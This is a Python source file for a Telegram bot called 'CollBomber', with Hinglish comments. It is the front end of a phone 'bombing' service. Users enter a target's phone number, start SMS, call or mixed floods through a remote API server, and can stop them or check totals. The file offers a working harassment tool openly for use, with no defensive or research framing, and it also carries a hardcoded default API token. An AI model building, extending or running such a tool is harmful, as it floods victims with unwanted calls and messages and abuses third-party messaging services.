#!/usr/bin/env python3
"""
🔥 CollBomber CLIENT BOT — Dost ke VPS ke liye
Yeh sirf Telegram UI hai. Real bombing API server pe hoti hai.
Code chori kare toh kuch nahi milega — APIs yahan nahi hain!
"""
import os, sys, json, threading, time, uuid
from datetime import datetime

# ====== CONFIG ======
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_SERVER = os.environ.get("API_SERVER", "http://192.168.1.100:5000")  # TERA SERVER KA IP
API_TOKEN = os.environ.get("API_TOKEN", "spx_Rolex@2026_api")  # API AUTH TOKEN

if not BOT_TOKEN:
    print("❌ BOT_TOKEN env set karo!")
    sys.exit(1)

# ====== TELEGRAM SETUP ======
try:
    import telebot
    from telebot import types
    import requests
except ImportError:
    os.system("pip install pyTelegramBotAPI requests --break-system-packages")
    import telebot
    from telebot import types
    import requests

bot = telebot.TeleBot(BOT_TOKEN)

# ====== HELPERS ======
def api_call(method, endpoint, data=None):
    """Call the remote API server"""
    url = f"{API_SERVER}/api/{endpoint}"
    headers = {"Authorization": f"Bearer {API_TOKEN}", "Content-Type": "application/json"}
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, params=data, timeout=15)
        else:
            r = requests.post(url, headers=headers, json=data, timeout=15)
        return r.json()
    except Exception as e:
        return {"success": False, "error": str(e)[:100]}

def main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        types.KeyboardButton("🔥 MIX"),
        types.KeyboardButton("💥 Bulk MIX"),
        types.KeyboardButton("📞 CALL"),
        types.KeyboardButton("🛡 Protect"),
        types.KeyboardButton("🔓 Unprotect"),
        types.KeyboardButton("📊 Status"),
        types.KeyboardButton("❓ Help"),
        types.KeyboardButton("🛑 Stop"),
    ]
    markup.add(*buttons)
    return markup

# ====== SESSION STORAGE ======
user_sessions = {}
user_phones = {}

# ====== HANDLERS ======
@bot.message_handler(commands=['start'])
def cmd_start(message):
    chat_id = message.chat.id
    bot.reply_to(message,
        "🔥 *CollBomber Ready!*\n\n"
        "Phone number bhejo, phir mode select karo!\n\n"
        "Available modes: MIX | SMS | CALL | WhatsApp",
        parse_mode="Markdown", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "🛑 Stop")
def btn_stop(message):
    chat_id = message.chat.id
    sid = user_sessions.get(chat_id)
    if sid:
        result = api_call("POST", "stop", {"session_id": sid})
        if result.get("success"):
            del user_sessions[chat_id]
            bot.reply_to(message, "🛑 *Stopped!*", parse_mode="Markdown", reply_markup=main_keyboard())
        else:
            bot.reply_to(message, f"❌ {result.get('error', 'Error')}", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, "❌ Koi active session nahi hai.", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "📊 Status")
def btn_status(message):
    chat_id = message.chat.id
    result = api_call("GET", "stats")
    if result.get("success"):
        s = result.get("status", {})
        bot.reply_to(message,
            f"📊 *Server Status*\n\n"
            f"🟢 Active Sessions: {s.get('active_sessions', 0)}\n"
            f"✅ Total OK: {s.get('total_ok', 0)}\n"
            f"❌ Total Fail: {s.get('total_fail', 0)}",
            parse_mode="Markdown", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, "❌ Server offline! API server check karo.", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "❓ Help")
def btn_help(message):
    bot.reply_to(message,
        "❓ *Help*\n\n"
        "1️⃣ Phone number bhejo\n"
        "2️⃣ Mode select karo: MIX / CALL / SMS\n"
        "3️⃣ 🛑 Stop se band karo\n\n"
        "Server: Remote API se connected",
        parse_mode="Markdown", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text in ["🔥 MIX", "💥 Bulk MIX", "📞 CALL"])
def btn_mode(message):
    chat_id = message.chat.id
    mode_map = {"🔥 MIX": "mix", "💥 Bulk MIX": "bulk_mix", "📞 CALL": "call"}
    mode = mode_map.get(message.text, "mix")
    phone = user_phones.get(chat_id)

    if not phone:
        user_sessions[chat_id + 1000000] = mode  # store pending mode
        bot.reply_to(message, "📱 Pehle phone number bhejo (10-digit):")
        return

    if mode == "bulk_mix":
        bot.reply_to(message, "💥 3 numbers comma se alag karke bhejo:\n`9876543210, 9876543211, 9876543212`", parse_mode="Markdown")
        return

    # Start bombing via API
    session_id = str(uuid.uuid4())
    result = api_call("POST", "start", {"session_id": session_id, "phone": phone, "mode": mode})
    if result.get("success"):
        user_sessions[chat_id] = session_id
        bot.reply_to(message,
            f"🔥 *{mode.upper()} started for* `{phone}`\n\n"
            f"🛑 Stop button se rok sakte ho!",
            parse_mode="Markdown", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, f"❌ {result.get('message', result.get('error', 'Error'))}", reply_markup=main_keyboard())

# Catch-all handler
@bot.message_handler(func=lambda m: True)
def handle_all(message):
    chat_id = message.chat.id
    text = message.text.strip()

    digits = ''.join(filter(str.isdigit, text))
    if len(digits) >= 10:
        phone = digits[-10:]
        user_phones[chat_id] = phone
        bot.reply_to(message, f"✅ Phone `{phone}` set! Ab mode select karo!", parse_mode="Markdown", reply_markup=main_keyboard())
        return

    bot.reply_to(message, "🤷 Kya karna chahte ho? Phone number bhejo ya /start press karo.", reply_markup=main_keyboard())

if __name__ == "__main__":
    print(f"🔥 CollBomber CLIENT BOT")
    print(f"🔗 API Server: {API_SERVER}")
    print(f"✅ Bot running! Press Ctrl+C to stop.")
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("Bye!")